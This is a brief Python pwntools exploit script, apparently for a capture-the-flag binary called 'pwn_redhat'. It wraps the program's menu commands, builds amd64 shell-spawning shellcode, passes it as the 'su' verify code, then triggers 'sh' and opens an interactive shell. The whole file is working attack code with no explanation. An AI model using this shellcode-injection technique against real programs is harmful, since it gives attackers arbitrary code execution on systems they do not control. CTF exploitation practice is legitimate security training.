from pwn import *


p = process('./pwn_redhat')
elf = ELF('./pwn_redhat')
context(arch = 'amd64')
#context.log_level = 'debug'

def ls():
	p.recvuntil('>>>')
	p.sendline('ls')

def touch(size,content):
	p.recvuntil('>>>')
	p.sendline('touch')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.sendline(content)

def rm(index):
	p.recvuntil('>>>')
	p.sendline('rm')
	p.recvuntil('Index:')
	p.sendline(str(index))

def su(code):
	p.recvuntil('>>>')
	p.sendline('su')
	p.recvuntil('verify code:')
	p.sendline(code)

def sh():
	p.recvuntil('>>>')
	p.sendline('sh')


shellcode = asm(shellcraft.sh())
su(shellcode)
sh()

p.interactive()
